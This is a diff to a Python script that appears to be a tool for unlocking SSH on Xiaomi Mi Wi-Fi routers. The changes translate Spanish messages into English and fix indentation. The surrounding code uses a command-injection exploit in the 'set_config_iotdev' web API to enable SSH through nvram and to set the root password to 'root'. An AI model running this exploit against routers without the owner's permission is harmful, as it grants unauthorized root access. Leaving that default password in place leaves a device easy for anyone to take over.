@@ -25,7 +25,7 @@ from gateway import *
 
 gw = Gateway(timeout = 4, detect_ssh = False)
 if gw.status < 1:
-  die("Xiaomi Mi Wi-Fi dispositivo no encontrado (IP: {})".format(gw.ip_addr))
+    die("Xiaomi Mi Wi-Fi device not found (IP: {})".format(gw.ip_addr))
 
 print("device_name =", gw.device_name)
 print("rom_version = {} {}".format(gw.rom_version, gw.rom_channel))
@@ -35,13 +35,13 @@ dn = gw.device_name
 gw.ssh_port = 22
 ret = gw.detect_ssh(verbose = 1, interactive = True)
 if ret > 0:
-  die(0, "Servidor SSH ya instalado y ejecutándose")
+    die(0, "SSH server already installed and running")
 
 stok = gw.web_login()
 
 
 def exec_cmd(cmd, api = 'API/misystem/set_config_iotdev'):
-      ######
+    ######
     # vuln/exploit author: LonGDikE
     # publication: https://forum.openwrt.org/t/55049/62
     ######
@@ -51,7 +51,7 @@ def exec_cmd(cmd, api = 'API/misystem/set_config_iotdev'):
 
 res = exec_cmd('nvram set bootdelay=3; set boot_wait=on; nvram set ssh_en=1; nvram commit;')
 if not res or int(res['code']) != 0:
-    die('¡El exploit "set_config_iotdev" no funciona!')
+    die('Exploit "set_config_iotdev" not working!')
 
 cmd = ''
 cmd += 'echo -e "root\\nroot" | passwd root' + '\n'
@@ -70,4 +70,3 @@ gw.ping(contimeout = 32)   # RSA host key generate very slow!
 
 print("")
 print("#### Connection to device {} is OK ####".format(gw.device_name))
-
